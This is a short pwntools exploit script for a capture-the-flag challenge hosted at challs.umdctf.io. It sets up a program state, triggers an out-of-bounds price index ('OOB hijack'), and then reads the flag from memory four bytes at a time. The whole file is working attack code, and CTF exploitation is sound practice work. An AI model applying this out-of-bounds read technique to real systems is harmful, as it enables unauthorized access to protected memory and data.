from pwn import *

p = remote('challs.umdctf.io', 30305)

def send_cmd(c):
    p.sendlineafter(b'> ', str(c).encode())

# Open account
send_cmd(1)
p.sendlineafter(b'bytes: ', b'4096')
p.recvuntil(b'account: ')
p.recvline()

# List markets (need 32768 total slots + extra to get right offset)
send_cmd(4)
p.sendlineafter(b'outcome_slots: ', b'32768')
p.sendlineafter(b'memo_bytes: ', b'0')
for _ in range(3):
    send_cmd(4)
    p.sendlineafter(b'outcome_slots: ', b'1')
    p.sendlineafter(b'memo_bytes: ', b'0')

# Open exchange
send_cmd(5)
p.recvuntil(b'exchange open\n')

# OOB hijack
send_cmd(6)
p.sendlineafter(b'price_index: ', b'32788')
p.sendlineafter(b'account: ', b'0')
p.sendlineafter(b'offset: ', b'0')
p.sendlineafter(b'range: ', b'4096')
p.recvuntil(b'quoted\n')

# Drain flag word by word
flag = b''
for word in range(64):
    send_cmd(7)
    p.sendlineafter(b'round: ', str(word).encode())
    p.recvuntil(b'settled\n')

    send_cmd(3)
    p.sendlineafter(b'account: ', b'0')
    p.sendlineafter(b'offset: ', str(word * 4).encode())
    p.sendlineafter(b'bytes: ', b'4')
    chunk = bytes.fromhex(p.recvline().strip().decode())
    flag += chunk
    print(f"word {word:02d}: {chunk} | {flag}")
    if b'\x00' in chunk:
        break

print(f"\nFLAG: {flag.split(b'\\x00')[0].decode()}")
p.close()
